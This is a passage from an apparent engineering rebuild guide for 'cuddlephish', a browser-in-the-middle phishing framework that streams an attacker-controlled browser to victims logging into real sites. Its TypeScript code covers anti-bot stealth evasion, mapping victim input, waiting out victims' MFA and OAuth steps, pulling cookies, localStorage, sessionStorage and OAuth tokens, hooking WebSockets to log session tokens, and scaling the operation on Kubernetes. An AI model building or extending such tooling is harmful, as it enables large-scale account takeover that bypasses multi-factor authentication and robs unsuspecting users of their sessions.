    args.push(`--display=${xvfbDisplay}`);
  }
  
  // Proxy support
  if (config.proxy) {
    args.push(`--proxy-server=${config.proxy}`);
  }
  
  // Additional stealth args
  args.push(
    '--disable-infobars',
    '--disable-notifications',
    '--disable-popup-blocking',
    '--lang=en-US,en',
  );
  
  return args;
};
```

#### Enhanced Stealth Plugin Configuration

```typescript
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';

// Configure stealth plugin with additional options
puppeteer.use(StealthPlugin({
  enabledEvasions: new Set([
    'chrome.app',
    'chrome.csi',
    'chrome.loadTimes',
    'chrome.runtime',
    'iframe.contentWindow',
    'media.codecs',
    'navigator.hardwareConcurrency',
    'navigator.languages',
    'navigator.permissions',
    'navigator.plugins',
    'navigator.vendor',
    'navigator.webdriver',
    'user-agent-override',
    'webgl.vendor',
    'window.outerdimensions',
  ]),
}));

// Additional user agent override
import UserAgentPlugin from 'puppeteer-extra-plugin-stealth/evasions/user-agent-override';
puppeteer.use(UserAgentPlugin({
  userAgent: config.browser.defaultUserAgent,
  locale: 'en-US',
  platform: 'Win32', // Can be made configurable
}));
```

#### Handling Anti-Bot Detection

```typescript
class AntiBotEvasion {
  async setupEvasion(page: Page): Promise<void> {
    // Override webdriver property
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', {
        get: () => undefined,
      });
      
      // Override permissions
      const originalQuery = window.navigator.permissions.query;
      window.navigator.permissions.query = (parameters) => (
        parameters.name === 'notifications' ?
          Promise.resolve({ state: Notification.permission }) :
          originalQuery(parameters)
      );
      
      // Mock Chrome object
      (window as any).chrome = {
        runtime: {},
        loadTimes: function() {},
        csi: function() {},
        app: {}
      };
    });
    
    // Add realistic mouse movements
    await this.addMouseMovement(page);
    
    // Set realistic timezone
    await page.emulateTimezone('America/New_York');
    
    // Set realistic geolocation (optional)
    await page.setGeolocation({ latitude: 40.7128, longitude: -74.0060 });
  }
  
  private async addMouseMovement(page: Page): Promise<void> {
    // Random mouse movements to simulate human behavior
    setInterval(async () => {
      const x = Math.random() * 1000;
      const y = Math.random() * 1000;
      await page.mouse.move(x, y, { steps: 10 });
    }, 5000 + Math.random() * 10000);
  }
}
```

### Browser Instance Lifecycle Management

#### Pre-warming Browser Pool

```typescript
class BrowserPoolManager {
  private idleBrowsers: Queue<BrowserInstance> = new Queue();
  private minPoolSize: number = 2;
  private maxPoolSize: number = 10;
  
  async initialize(): Promise<void> {
    // Pre-create minimum pool size
    for (let i = 0; i < this.minPoolSize; i++) {
      const browser = await this.createIdleBrowser();
      this.idleBrowsers.enqueue(browser);
    }
    
    // Start cleanup task
    this.startCleanupTask();
  }
  
  private async createIdleBrowser(): Promise<BrowserInstance> {
    const browser = await this.createBrowser(this.getDefaultTarget());
    browser.status = 'idle';
    return browser;
  }
  
  private startCleanupTask(): void {
    setInterval(async () => {
      await this.cleanupIdleBrowsers();
    }, 60000); // Every minute
  }
  
  private async cleanupIdleBrowsers(): Promise<void> {
    const now = Date.now();
    const maxIdleTime = 5 * 60 * 1000; // 5 minutes
    
    while (!this.idleBrowsers.isEmpty()) {
      const browser = this.idleBrowsers.peek();
      if (now - browser.lastUsed.getTime() > maxIdleTime) {
        const oldBrowser = this.idleBrowsers.dequeue();
        await this.cleanupBrowser(oldBrowser.id);
      } else {
        break;
      }
    }
  }
  
  async getOrCreateBrowser(targetUrl: string): Promise<BrowserInstance> {
    // Try to reuse idle browser
    if (!this.idleBrowsers.isEmpty()) {
      const browser = this.idleBrowsers.dequeue();
      // Navigate to new target
      await browser.targetPage.goto(targetUrl);
      return browser;
    }
    
    // Create new browser if under max pool size
    if (this.browsers.size < this.maxPoolSize) {
      return await this.createBrowser(targetUrl);
    }
    
    // Wait for available browser or throw error
    throw new Error('Browser pool exhausted');
  }
}
```

#### Browser Crash Recovery

```typescript
class BrowserInstance {
  private crashHandler: (browser: BrowserInstance) => Promise<void>;
  
  setupCrashHandling(): void {
    this.puppeteerBrowser.on('disconnected', async () => {
      logger.error(`Browser ${this.id} disconnected unexpectedly`);
      await this.handleCrash();
    });
    
    // Monitor for page crashes
    this.targetPage.on('error', async (error) => {
      logger.error(`Page error in browser ${this.id}:`, error);
      await this.handlePageCrash();
    });
  }
  
  private async handleCrash(): Promise<void> {
    // Clean up resources
    await this.cleanup();
    
    // Notify session manager
    if (this.crashHandler) {
      await this.crashHandler(this);
    }
    
    // Attempt to recreate if needed
    if (this.status === 'paired') {
      logger.info(`Attempting to recreate browser ${this.id} for session`);
      // Trigger session to get new browser
    }
  }
  
  private async handlePageCrash(): Promise<void> {
    try {
      // Reload the page
      await this.targetPage.reload({ waitUntil: 'networkidle2' });
      logger.info(`Page reloaded for browser ${this.id}`);
    } catch (error) {
      logger.error(`Failed to reload page for browser ${this.id}:`, error);
      await this.handleCrash();
    }
  }
}
```

### Input Event Handling Optimizations

#### Event Throttling & Debouncing

```typescript
class InputEventRouter {
  private eventQueues: Map<string, InputEvent[]> = new Map();
  private processing: Map<string, boolean> = new Map();
  
  async routeEvent(event: InputEvent): Promise<void> {
    const sessionId = event.sessionId;
    
    // Add to queue
    if (!this.eventQueues.has(sessionId)) {
      this.eventQueues.set(sessionId, []);
    }
    this.eventQueues.get(sessionId)!.push(event);
    
    // Process queue if not already processing
    if (!this.processing.get(sessionId)) {
      this.processQueue(sessionId);
    }
  }
  
  private async processQueue(sessionId: string): Promise<void> {
    this.processing.set(sessionId, true);
    
    try {
      while (this.eventQueues.has(sessionId) && this.eventQueues.get(sessionId)!.length > 0) {
        const event = this.eventQueues.get(sessionId)!.shift()!;
        await this.executeEvent(event);
        
        // Throttle high-frequency events (mousemove)
        if (event.type === 'mousemove') {
          await this.delay(16); // ~60fps
        }
      }
    } finally {
      this.processing.set(sessionId, false);
    }
  }
  
  // Batch mousemove events
  private batchMouseMoveEvents(events: InputEvent[]): InputEvent[] {
    const mousemoveEvents = events.filter(e => e.type === 'mousemove');
    const otherEvents = events.filter(e => e.type !== 'mousemove');
    
    // Only keep the last mousemove event
    const lastMouseMove = mousemoveEvents[mousemoveEvents.length - 1];
    
    return [...otherEvents, ...(lastMouseMove ? [lastMouseMove] : [])];
  }
}
```

#### Coordinate Translation

```typescript
class ViewportMapper {
  mapCoordinates(
    event: { clientX: number; clientY: number },
    victimViewport: { width: number; height: number },
    browserViewport: { width: number; height: number }
  ): { x: number; y: number } {
    // Scale coordinates proportionally
    const scaleX = browserViewport.width / victimViewport.width;
    const scaleY = browserViewport.height / victimViewport.height;
    
    return {
      x: Math.round(event.clientX * scaleX),
      y: Math.round(event.clientY * scaleY),
    };
  }
  
  mapMouseEvent(
    event: MouseEventData,
    victimViewport: Viewport,
    browserViewport: Viewport
  ): MouseEventData {
    const mapped = this.mapCoordinates(
      { clientX: event.clientX, clientY: event.clientY },
      victimViewport,
      browserViewport
    );
    
    return {
      ...event,
      clientX: mapped.x,
      clientY: mapped.y,
    };
  }
}
```

### Performance Considerations

#### Resource Limits & Monitoring

```typescript
class ResourceMonitor {
  private metrics: {
    activeBrowsers: number;
    memoryUsage: NodeJS.MemoryUsage;
    cpuUsage: NodeJS.CpuUsage;
    activeSessions: number;
  };
  
  async checkResourceLimits(): Promise<boolean> {
    const memory = process.memoryUsage();
    const memoryUsageMB = memory.heapUsed / 1024 / 1024;
    const maxMemoryMB = 4096; // 4GB limit
    
    if (memoryUsageMB > maxMemoryMB) {
      logger.warn(`Memory usage high: ${memoryUsageMB.toFixed(2)}MB`);
      return false;
    }
    
    // Check browser count
    if (this.metrics.activeBrowsers >= config.browser.maxInstances) {
      logger.warn('Maximum browser instances reached');
      return false;
    }
    
    return true;
  }
  
  async getMetrics(): Promise<SystemMetrics> {
    return {
      memory: process.memoryUsage(),
      cpu: process.cpuUsage(),
      activeBrowsers: this.metrics.activeBrowsers,
      activeSessions: this.metrics.activeSessions,
      uptime: process.uptime(),
    };
  }
}
```

#### Database Connection Pooling

```typescript
import { Pool } from 'pg';

class DatabaseManager {
  private pool: Pool;
  
  constructor(connectionString: string) {
    this.pool = new Pool({
      connectionString,
      max: 20, // Maximum pool size
      idleTimeoutMillis: 30000,
      connectionTimeoutMillis: 2000,
    });
    
    // Handle pool errors
    this.pool.on('error', (err) => {
      logger.error('Unexpected database pool error:', err);
    });
  }
  
  async query<T>(text: string, params?: any[]): Promise<T[]> {
    const start = Date.now();
    try {
      const res = await this.pool.query(text, params);
      const duration = Date.now() - start;
      logger.debug('Executed query', { text, duration, rows: res.rowCount });
      return res.rows;
    } catch (error) {
      logger.error('Database query error:', error);
      throw error;
    }
  }
}
```

### Security Hardening

#### Admin Authentication

```typescript
import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

class AdminAuthService {
  async authenticate(socket: Socket, password: string): Promise<boolean> {
    // Verify IP whitelist
    const clientIp = socket.handshake.address;
    if (!config.admin.allowedIps.includes(clientIp)) {
      logger.warn(`Unauthorized admin access attempt from ${clientIp}`);
      return false;
    }
    
    // Verify password/token
    const hashedPassword = await this.getHashedPassword();
    const isValid = await bcrypt.compare(password, hashedPassword);
    
    if (isValid) {
      const token = jwt.sign(
        { ip: clientIp, timestamp: Date.now() },
        config.admin.jwtSecret,
        { expiresIn: '24h' }
      );
      
      socket.data.token = token;
      socket.join('admin_room');
      return true;
    }
    
    return false;
  }
  
  verifyToken(token: string): boolean {
    try {
      jwt.verify(token, config.admin.jwtSecret);
      return true;
    } catch (error) {
      return false;
    }
  }
}
```

#### Input Validation & Sanitization

```typescript
import { z } from 'zod';

const InputEventSchema = z.object({
  type: z.enum(['mousedown', 'mouseup', 'mousemove', 'click', 'mousewheel', 'keydown', 'keyup', 'paste']),
  sessionId: z.string().uuid(),
  data: z.object({
    clientX: z.number().min(0).max(10000).optional(),
    clientY: z.number().min(0).max(10000).optional(),
    key: z.string().max(100).optional(),
    wheelDeltaX: z.number().optional(),
    wheelDeltaY: z.number().optional(),
  }),
  timestamp: z.number(),
});

class InputValidator {
  validate(event: unknown): InputEvent {
    try {
      return InputEventSchema.parse(event);
    } catch (error) {
      if (error instanceof z.ZodError) {
        throw new ValidationError('Invalid input event', error.errors);
      }
      throw error;
    }
  }
}
```

### Troubleshooting Guide

#### Common Issues & Solutions

**1. Blank White Page on Victim Side**

**Symptoms**: Victim sees blank page, no video stream

**Diagnosis Steps**:
```typescript
// Add comprehensive logging
class WebRTCDiagnostic {
  logConnectionState(peerConnection: RTCPeerConnection, stage: string): void {
    logger.info(`[${stage}] ICE Connection State: ${peerConnection.iceConnectionState}`);
    logger.info(`[${stage}] Connection State: ${peerConnection.connectionState}`);
    logger.info(`[${stage}] Signaling State: ${peerConnection.signalingState}`);
    
    // Log ICE candidates
    peerConnection.onicecandidate = (event) => {
      if (event.candidate) {
        logger.debug(`[${stage}] ICE Candidate:`, event.candidate.candidate);
      } else {
        logger.info(`[${stage}] ICE Gathering Complete`);
      }
    };
  }
}
```

**Solutions**:
- Check STUN/TURN server connectivity
- Verify tab title matches (handle redirects)
- Check firewall rules
- Verify WebRTC is enabled in browser
- Check browser console for errors

**2. Browser Instance Fails to Start**

**Symptoms**: No browser connects, errors in logs

**Solutions**:
```typescript
// Enhanced error handling
async function createBrowser(targetUrl: string): Promise<BrowserInstance> {
  try {
    // Check if Xvfb is available
    if (!xvfbDisplay) {
      throw new Error('Xvfb display not available');
    }
    
    // Check system resources
    const hasResources = await resourceMonitor.checkResourceLimits();
    if (!hasResources) {
      throw new Error('Insufficient system resources');
    }
    
    const browser = await puppeteer.launch(/* ... */);
    return browser;
  } catch (error) {
    logger.error('Failed to create browser:', error);
    // Cleanup partial resources
    await cleanup();
    throw error;
  }
}
```

**3. High Memory Usage**

**Symptoms**: Server becomes slow, browsers crash

**Solutions**:
- Implement browser recycling
- Set memory limits per browser
- Monitor and cleanup idle browsers
- Implement connection limits
- Use browser connection pooling

**4. WebRTC Connection Drops**

**Symptoms**: Video stream stops, reconnection needed

**Solutions**:
```typescript
class ConnectionManager {
  private reconnectAttempts: Map<string, number> = new Map();
  
  async handleDisconnection(sessionId: string): Promise<void> {
    const attempts = this.reconnectAttempts.get(sessionId) || 0;
    
    if (attempts < 3) {
      this.reconnectAttempts.set(sessionId, attempts + 1);
      await this.delay(1000 * (attempts + 1)); // Exponential backoff
      await this.reconnect(sessionId);
    } else {
      // Notify admin of persistent connection issues
      this.notifyAdmin(sessionId, 'Connection failed after multiple attempts');
    }
  }
}
```

### Monitoring & Alerting

#### Key Metrics to Track

```typescript
interface Metrics {
  // Session metrics
  activeSessions: number;
  totalSessions: number;
  sessionDuration: number[];
  
  // Browser metrics
  activeBrowsers: number;
  browsersCreated: number;
  browsersDestroyed: number;
  browserCrashes: number;
  
  // Connection metrics
  webrtcConnections: number;
  webrtcFailures: number;
  averageConnectionTime: number;
  
  // Performance metrics
  memoryUsage: number;
  cpuUsage: number;
  eventQueueSize: number;
  
  // Error metrics
  errors: Map<string, number>;
  warnings: Map<string, number>;
}

class MetricsCollector {
  private metrics: Metrics;
  
  recordMetric(name: keyof Metrics, value: number): void {
    // Record metric
    // Send to monitoring system (Prometheus, etc.)
  }
  
  getMetrics(): Metrics {
    return this.metrics;
  }
}
```

#### Health Check Endpoint

```typescript
app.get('/health', async (req, res) => {
  const health = {
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    resources: {
      activeBrowsers: browserPoolManager.activeCount,
      activeSessions: sessionManager.activeCount,
      availableBrowsers: browserPoolManager.availableCount,
    },
    checks: {
      database: await checkDatabase(),
      redis: await checkRedis(),
      xvfb: await checkXvfb(),
    },
  };
  
  const isHealthy = health.checks.database && health.checks.redis && health.checks.xvfb;
  
  res.status(isHealthy ? 200 : 503).json(health);
});
```

### Configuration Examples

#### Complete Config Example

```yaml
# config.yaml
server:
  port: 58082
  host: 0.0.0.0
  bodyLimit: 19922944

admin:
  allowedIps:
    - "1.1.1.1"
    - "2.2.2.2"
  socketKey: "your-secure-random-key-here-min-32-chars"
  jwtSecret: "your-jwt-secret-here-min-32-chars"

browser:
  maxInstances: 10
  minPoolSize: 2
  idleTimeout: 300000
  userDataBasePath: "./user_data"
  defaultUserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  proxy: null  # "http://proxy.example.com:8080"
  
webrtc:
  stunServers:
    - urls: "stun:stun.l.google.com:19302"
    - urls: "stun:stun1.l.google.com:19302"
  turnServers:
    - urls: "turn:turn.example.com:3478?transport=tcp"
      username: "username"
      credential: "password"

database:
  type: "postgresql"
  connectionString: "postgresql://user:pass@localhost:5432/cuddlephish"

redis:
  host: "localhost"
  port: 6379
  password: null

logging:
  level: "info"
  format: "json"
  file: "./logs/cuddlephish.log"
```

#### Target Configuration

```json
{
  "example": {
    "loginPage": "https://example.com/login",
    "bootLocation": "https://example.com/login",
    "tabTitle": "Example - Sign In",
    "favicon": "example.ico",
    "payload": "payload.txt",
    "waitForSelector": "#login-button",  // Optional: wait for specific element
    "screenshotOnLogin": true
  }
}
```

---

### Advanced Edge Cases & Solutions

#### Handling Target Sites with Complex Authentication Flows

**Challenge**: Some sites have multi-step authentication, captchas, or OAuth flows

**Solution**:
```typescript
class AuthenticationFlowHandler {
  async handleOAuthFlow(browser: BrowserInstance, targetConfig: TargetConfig): Promise<void> {
    const page = browser.targetPage;
    
    // Wait for OAuth redirect
    await page.waitForURL('**/oauth/callback**', { timeout: 60000 });
    
    // Handle OAuth callback
    await page.waitForNavigation({ waitUntil: 'networkidle2' });
    
    // Extract OAuth tokens if needed
    const tokens = await page.evaluate(() => {
      return {
        accessToken: localStorage.getItem('access_token'),
        refreshToken: localStorage.getItem('refresh_token'),
      };
    });
    
    logger.info('OAuth flow completed', { browserId: browser.id });
  }
  
  async handleMFA(browser: BrowserInstance): Promise<void> {
    // Wait for MFA prompt
    const mfaPrompt = await browser.targetPage.waitForSelector('#mfa-code', { timeout: 30000 });
    
    if (mfaPrompt) {
      // Log that MFA is required - victim will enter code
      logger.info('MFA prompt detected', { browserId: browser.id });
      // Continue monitoring for completion
    }
  }
}
```

#### Handling Sites with WebSocket Connections

**Challenge**: Some sites use WebSockets that need to be maintained

**Solution**:
```typescript
class WebSocketInterceptor {
  async interceptWebSockets(page: Page): Promise<void> {
    // Listen for WebSocket connections
    page.on('request', async (request) => {
      if (request.url().startsWith('ws://') || request.url().startsWith('wss://')) {
        logger.debug('WebSocket connection detected', { url: request.url() });
        
        // Monitor WebSocket messages if needed
        await this.monitorWebSocketMessages(page, request.url());
      }
    });
  }
  
  private async monitorWebSocketMessages(page: Page, wsUrl: string): Promise<void> {
    // Inject script to monitor WebSocket messages
    await page.evaluateOnNewDocument((url) => {
      const originalWebSocket = window.WebSocket;
      window.WebSocket = function(...args) {
        const ws = new originalWebSocket(...args);
        
        ws.addEventListener('message', (event) => {
          // Log sensitive messages (tokens, session IDs, etc.)
          const data = event.data;
          if (typeof data === 'string') {
            try {
              const json = JSON.parse(data);
              if (json.token || json.sessionId || json.accessToken) {
                console.log('[WebSocket] Sensitive data detected:', json);
              }
            } catch (e) {
              // Not JSON, ignore
            }
          }
        });
        
        return ws;
      };
    }, wsUrl);
  }
}
```

#### Handling Video/Audio Content

**Challenge**: Some sites require audio/video permissions or playback

**Solution**:
```typescript
class MediaHandler {
  async setupMediaHandling(page: Page): Promise<void> {
    // Grant media permissions
    const context = page.browserContext();
    await context.overridePermissions(page.url(), ['camera', 'microphone']);
    
    // Handle media autoplay
    await page.evaluateOnNewDocument(() => {
      // Mock media devices
      navigator.mediaDevices.getUserMedia = async () => {
        // Return mock stream or handle appropriately
        return new MediaStream();
      };
    });
  }
}
```

#### Handling Single-Page Applications (SPAs)

**Challenge**: SPAs don't trigger traditional navigation events

**Solution**:
```typescript
class SPANavigationHandler {
  async monitorSPANavigation(page: Page, sessionId: string): Promise<void> {
    // Monitor for URL changes in SPAs
    let currentUrl = page.url();
    
    setInterval(async () => {
      const newUrl = page.url();
      if (newUrl !== currentUrl) {
        currentUrl = newUrl;
        
        // Update session state
        await sessionManager.updateSessionUrl(sessionId, newUrl);
        
        // Push URL to victim (for history API)
        socketManager.to(sessionId).emit('push_state', newUrl.split('/').slice(3).join('/'));
        
        logger.debug('SPA navigation detected', { sessionId, url: newUrl });
      }
    }, 1000);
    
    // Also listen for pushState/replaceState
    await page.evaluateOnNewDocument(() => {
      const originalPushState = history.pushState;
      const originalReplaceState = history.replaceState;
      
      history.pushState = function(...args) {
        originalPushState.apply(history, args);
        window.dispatchEvent(new Event('popstate'));
      };
      
      history.replaceState = function(...args) {
        originalReplaceState.apply(history, args);
        window.dispatchEvent(new Event('popstate'));
      };
    });
  }
}
```

### Deployment Scenarios

#### Scenario 1: Single Server Deployment

**Use Case**: Small operations, testing, development

**Architecture**:
```
[Internet] -> [Caddy (TLS)] -> [Node.js App] -> [PostgreSQL] + [Redis]
                                              -> [Xvfb + Chrome]
```

**Docker Compose**:
```yaml
version: '3.8'
services:
  app:
    build: .
    environment:
      - DATABASE_URL=postgresql://postgres:pass@db:5432/cuddlephish
      - REDIS_HOST=redis
    volumes:
      - ./user_data:/app/user_data
      - ./targets.json:/app/targets.json
    depends_on:
      - db
      - redis

  db:
    image: postgres:15-alpine
    environment:
      - POSTGRES_DB=cuddlephish
      - POSTGRES_USER=postgres
      - POSTGRES_PASSWORD=pass
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine

volumes:
  postgres_data:
```

#### Scenario 2: Load-Balanced Multi-Server Deployment

**Use Case**: High-traffic operations, multiple targets

**Architecture**:
```
[Internet] -> [Load Balancer] -> [Node.js App 1] -> [Shared PostgreSQL]
                              -> [Node.js App 2] -> [Shared Redis Cluster]
                              -> [Node.js App N] -> [Shared Storage (NFS/S3)]
```

**Key Considerations**:
- **Sticky Sessions**: Use session affinity for WebSocket connections
- **Shared Storage**: Browser user_data directories on shared storage (NFS, EBS)
- **Redis Cluster**: For session state synchronization
- **Database Connection Pooling**: Shared connection pool
- **Browser Instance Affinity**: Route same session to same server

**Implementation**:
```typescript
// Use Redis pub/sub for cross-server communication
class DistributedSessionManager {
  private redis: RedisClient;
  private pub: RedisClient;
  private sub: RedisClient;
  
  constructor() {
    this.redis = new Redis(config.redis);
    this.pub = new Redis(config.redis);
    this.sub = new Redis(config.redis);
    
    // Subscribe to session updates
    this.sub.subscribe('session:update', 'session:terminate');
    this.sub.on('message', (channel, message) => {
      this.handleRedisMessage(channel, JSON.parse(message));
    });
  }
  
  async updateSession(sessionId: string, updates: Partial<Session>): Promise<void> {
    // Update local state
    await this.updateLocalSession(sessionId, updates);
    
    // Publish to other servers
    await this.pub.publish('session:update', JSON.stringify({
      sessionId,
      updates,
      serverId: process.env.SERVER_ID,
    }));
  }
}
```

#### Scenario 3: Kubernetes Deployment

**Use Case**: Enterprise-scale, auto-scaling, high availability

**Architecture**:
```
[Internet] -> [Ingress Controller] -> [Service] -> [Pods (Node.js)]
                                              -> [StatefulSet (PostgreSQL)]
                                              -> [StatefulSet (Redis)]
                                              -> [Persistent Volumes]
```

**Kubernetes Manifests**:

```yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cuddlephish
spec:
  replicas: 3
  selector:
    matchLabels:
      app: cuddlephish
  template:
    metadata:
      labels:
        app: cuddlephish
    spec:
      containers:
      - name: app
        image: cuddlephish:latest
        env:
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: cuddlephish-secrets
              key: database-url
        - name: REDIS_HOST
          value: redis-service
        resources:
          requests:
            memory: "2Gi"
            cpu: "1000m"
          limits:
            memory: "4Gi"
            cpu: "2000m"
        volumeMounts:
        - name: user-data
          mountPath: /app/user_data
      volumes:
      - name: user-data
        persistentVolumeClaim:
          claimName: cuddlephish-storage
```

**Horizontal Pod Autoscaler**:
```yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: cuddlephish-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: cuddlephish
  minReplicas: 2
  maxReplicas: 10
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70
  - type: Resource
    resource:
      name: memory
      target:
        type: Utilization
        averageUtilization: 80
```

### Migration Guide from Legacy Version

#### Step-by-Step Migration

**Phase 1: Preparation**
1. Backup existing `targets.json` and `config.json`
2. Export existing session data (if any)
3. Document current configuration

**Phase 2: Data Migration**

```typescript
// Migration script
import fs from 'fs';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

async function migrateTargets() {
  const legacyTargets = JSON.parse(fs.readFileSync('./targets.json', 'utf8'));
  
  for (const [key, target] of Object.entries(legacyTargets)) {
    await prisma.target.create({
      data: {
        name: key,
        loginPage: target.login_page,
        bootLocation: target.boot_location,
        tabTitle: target.tab_title,
        favicon: target.favicon,
        payload: target.payload,
      },
    });
  }
}

async function migrateConfig() {
  const legacyConfig = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
  
  // Convert to new config format
  const newConfig = {
    server: {
      port: 58082,
      host: '0.0.0.0',
    },
    admin: {
      allowedIps: legacyConfig.admin_ips,
      socketKey: legacyConfig.socket_key,
      jwtSecret: generateSecureRandom(32),
    },
    browser: {
      defaultUserAgent: legacyConfig.default_user_agent,
      // ... other mappings
    },
  };
  
  fs.writeFileSync('./config.yaml', yaml.dump(newConfig));
}
```

**Phase 3: Gradual Rollout**
1. Deploy new version alongside old version
2. Use different ports (58082 for old, 58083 for new)
3. Test new version with test targets
4. Gradually migrate traffic
5. Monitor for issues
6. Full cutover once stable

**Phase 4: Cleanup**
1. Archive old version
2. Remove old dependencies
3. Update documentation
4. Train team on new features

### Additional Tools & Scripts

#### Browser Debugging Tool

```typescript
// scripts/debug-browser.ts
async function debugBrowser(browserId: string) {
  const browser = await browserPoolManager.getBrowser(browserId);
  
  // Open DevTools
  const client = await browser.targetPage.target().createCDPSession();
  await client.send('Runtime.enable');
  await client.send('Debugger.enable');
  
  // Monitor console
  client.on('Runtime.consoleAPICalled', (event) => {
    console.log('[Browser Console]', event);
  });
  
  // Monitor network
  await client.send('Network.enable');
  client.on('Network.responseReceived', (event) => {
    console.log('[Network]', event.response.url, event.response.status);
  });
  
  // Take screenshot
  const screenshot = await browser.targetPage.screenshot();
  fs.writeFileSync(`debug-${browserId}.png`, screenshot);
  
  console.log(`Debugging browser ${browserId}. Screenshot saved.`);
}
```

#### Session Replay Tool

```typescript
// Record all events for replay
class SessionRecorder {
  private events: Event[] = [];
  
  recordEvent(event: InputEvent): void {
    this.events.push({
      ...event,
      timestamp: Date.now(),
    });
  }
  
  async saveRecording(sessionId: string): Promise<string> {
    const filename = `recording-${sessionId}-${Date.now()}.json`;
    fs.writeFileSync(filename, JSON.stringify(this.events, null, 2));
    return filename;
  }
  
  async replay(browser: BrowserInstance, recordingFile: string): Promise<void> {
    const events = JSON.parse(fs.readFileSync(recordingFile, 'utf8'));
    
    for (const event of events) {
      await this.delay(event.timestamp - (events[events.indexOf(event) - 1]?.timestamp || 0));
      await this.executeEvent(browser, event);
    }
  }
}
```

#### Performance Profiling

```typescript
// Profile browser instance performance
class PerformanceProfiler {
  async profileBrowser(browserId: string): Promise<PerformanceProfile> {
    const browser = await browserPoolManager.getBrowser(browserId);
    const page = browser.targetPage;
    
    // Get performance metrics
    const metrics = await page.metrics();
    const performanceTiming = await page.evaluate(() => {
      return JSON.parse(JSON.stringify(window.performance.timing));
    });
    
    return {
      browserId,
      timestamp: new Date(),
      metrics,
      performanceTiming,
      memory: await page.evaluate(() => {
        return (performance as any).memory;
      }),
    };
  }
}
```

---

## Legacy Patterns to Avoid

This section identifies old patterns from the original implementation that should NOT be used in the modern rebuild. Use the modern alternatives provided.

### ❌ DON'T: Access Private Puppeteer APIs

**Legacy Pattern:**
```typescript
// BAD - Accesses private _client property
let cookie_data = await target_page._client.send('Storage.getCookies')
let dom_data = await target_page._client.send('DOMStorage.getDOMStorageItems', {...})
await page._client.send('Input.dispatchKeyEvent', {...})
```

**Why it's bad:**
- `_client` is a private API, subject to breaking changes
- Not documented or stable
- TypeScript won't recognize these methods
- Fragile and maintenance nightmare

**✅ DO: Use Public Puppeteer/Playwright APIs**

```typescript
// GOOD - Public APIs
class CredentialExtractor {
  async extractCookies(page: Page): Promise<Cookie[]> {
    return await page.cookies();
  }
  
  async extractLocalStorage(page: Page): Promise<Record<string, string>> {
    return await page.evaluate(() => {
      const storage: Record<string, string> = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          storage[key] = localStorage.getItem(key) || '';
        }
      }
      return storage;
    });
  }
  
  async extractSessionStorage(page: Page): Promise<Record<string, string>> {
    return await page.evaluate(() => {
      const storage: Record<string, string> = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          storage[key] = sessionStorage.getItem(key) || '';
        }
      }
      return storage;
    });
  }
}

// For keyboard input, use public APIs
await page.keyboard.type(text);
await page.keyboard.press('Enter');
await page.keyboard.down('Shift');
```

**Alternative: Use CDP Session Explicitly (Only if Public API Doesn't Exist)**

```typescript
// If you MUST use CDP (last resort), do it explicitly and safely
async function extractCookiesViaCDP(page: Page): Promise<Cookie[]> {
  const client = await page.target().createCDPSession();
  try {
    const response = await client.send('Network.getAllCookies');
    return response.cookies;
  } finally {
    await client.detach();
  }
}
```

### ❌ DON'T: Stream-Based Template Injection

**Legacy Pattern:**
```typescript
// BAD - stream-replace for template injection
let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
reply.type('text/html').send(
  stream.pipe(replace(/PAGE_TITLE/, target.tab_title))
        .pipe(replace(/CLIENT_IP/, client_ip))
)
```

**Why it's bad:**
- Not type-safe
- Error-prone string replacement
- No template validation
- Hard to maintain

**✅ DO: Build-Time Template Injection or Modern Templating**

```typescript
// Option 1: Build-time replacement (Vite/Webpack)
// In victim page component
export const VictimPage = ({ target, clientIp }: Props) => {
  useEffect(() => {
    document.title = target.tabTitle;
  }, [target.tabTitle]);
  
  return <VideoStream clientIp={clientIp} />;
};

// Option 2: Server-side templating with proper engine
import { render } from 'mustache';

app.get('/*', async (req, res) => {
  const template = await fs.promises.readFile('./templates/victim.html', 'utf8');
  const html = render(template, {
    pageTitle: target.tabTitle,
    clientIp: req.ip,
  });
  res.send(html);
});

// Option 3: React/Vue SSR (best for modern stack)
// Server renders React component to HTML string
import { renderToString } from 'react-dom/server';

app.get('/*', (req, res) => {
  const html = renderToString(<VictimApp target={target} clientIp={req.ip} />);
  res.send(`<!DOCTYPE html>${html}`);
});
```

### ❌ DON'T: Manual Static File Serving

**Legacy Pattern:**
```typescript
// BAD - Manual routes for every static file
fastify.route({
  method: ['GET'],
  url: '/jquery.min.js',
  handler: async function (req, reply) {
    let stream = fs.createReadStream(__dirname + "/node_modules/jquery/dist/jquery.min.js")
    reply.type('text/javascript').send(stream)
  }
})

fastify.route({
  method: ['GET'],
  url: '/static/css/*',
  handler: async function (req, reply) {
    // Manual path resolution...
  }
})
```

**Why it's bad:**
- Repetitive boilerplate
- No caching headers
- No compression
- Security issues with path traversal
- Maintenance nightmare

**✅ DO: Use Framework Static File Middleware**

```typescript
// Fastify
import fastifyStatic from '@fastify/static';
import path from 'path';

await fastify.register(fastifyStatic, {
  root: path.join(__dirname, '../client/victim/dist'),
  prefix: '/static/',
  setHeaders: (res, pathname) => {
    // Proper caching headers
    if (pathname.endsWith('.js') || pathname.endsWith('.css')) {
      res.setHeader('Cache-Control', 'public, max-age=31536000');
    }
  },
});

// Express
import express from 'express';

app.use('/static', express.static(path.join(__dirname, '../client/victim/dist'), {
  maxAge: '1y',
  etag: true,
}));
```

